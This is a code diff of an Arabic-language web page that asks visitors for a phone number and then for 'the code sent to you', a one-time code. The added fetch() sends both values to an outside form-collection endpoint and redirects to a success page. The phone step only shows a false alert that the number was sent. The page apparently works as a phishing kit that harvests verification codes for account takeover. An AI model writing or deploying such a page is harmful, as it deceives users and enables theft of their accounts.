@@ -90,15 +90,14 @@
   <div class="container">
     <h2>نموذج رقم الهاتف والكود</h2>
 
-    <form id="phoneForm" action="https://formcarry.com/s/zmPYXkf3utw" method="POST" onsubmit="return sendPhone(event);">
+    <form id="phoneForm" onsubmit="return sendPhone(event);">
       <label for="phone">رقم الهاتف:</label>
       <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
       <button type="submit" id="sendPhoneBtn">إرسال رقم الهاتف</button>
       <div id="timer"></div>
     </form>
 
-    <!-- سيتم الإرسال إلى صفحة success.html -->
-    <form id="codeForm" action="https://formcarry.com/s/zmPYXkf3utw" method="POST" onsubmit="return sendCode(event);">
+    <form id="codeForm" onsubmit="return sendCode(event);">
       <div id="codeField">
         <label for="code">الكود المرسل إليك:</label>
         <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" autocomplete="one-time-code" />
@@ -145,22 +144,11 @@
         return false;
       }
 
-      // أضف كود فارغ في حقل مخفي
-      let hiddenCode = phoneForm.querySelector('input[name="code"]');
-      if (!hiddenCode) {
-        hiddenCode = document.createElement('input');
-        hiddenCode.type = 'hidden';
-        hiddenCode.name = 'code';
-        phoneForm.appendChild(hiddenCode);
-      }
-      hiddenCode.value = '';
-
-      phoneForm.submit();
-
-      // أظهر حقل الكود وابدأ المؤقت
       codeField.style.display = 'block';
       sendPhoneBtn.disabled = true;
-      startTimer(480);
+      startTimer(480); // 8 دقائق
+
+      alert('تم إرسال رقم الهاتف بنجاح، سيتم إرسال الكود قريبًا.');
 
       return false;
     }
@@ -174,23 +162,30 @@
         return false;
       }
 
-      // أضف رقم الهاتف كمخفي
-      let hiddenPhone = codeForm.querySelector('input[name="phone"]');
-      if (!hiddenPhone) {
-        hiddenPhone = document.createElement('input');
-        hiddenPhone.type = 'hidden';
-        hiddenPhone.name = 'phone';
-        codeForm.appendChild(hiddenPhone);
-      }
-      hiddenPhone.value = phoneInput.value;
+      const payload = {
+        phone: phoneInput.value,
+        code: codeInput.value
+      };
 
-      // بعد التأكد من صحة البيانات، نرسل النموذج ثم ننتقل لصفحة النجاح
-      codeForm.submit();
-
-      // الانتقال لصفحة النجاح بعد لحظات قصيرة (يمكنك استبدالها بـ redirect فوري)
-      setTimeout(() => {
-        window.location.href = "success.html";
-      }, 1000); // 1 ثانية
+      fetch('https://formcarry.com/s/zmPYXkf3utw', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = 'success.html';
+        } else {
+          alert('حدث خطأ أثناء إرسال الكود. حاول مرة أخرى.');
+        }
+      })
+      .catch(error => {
+        console.error('فشل الإرسال:', error);
+        alert('فشل الاتصال بالسيرفر.');
+      });
 
       return false;
     }
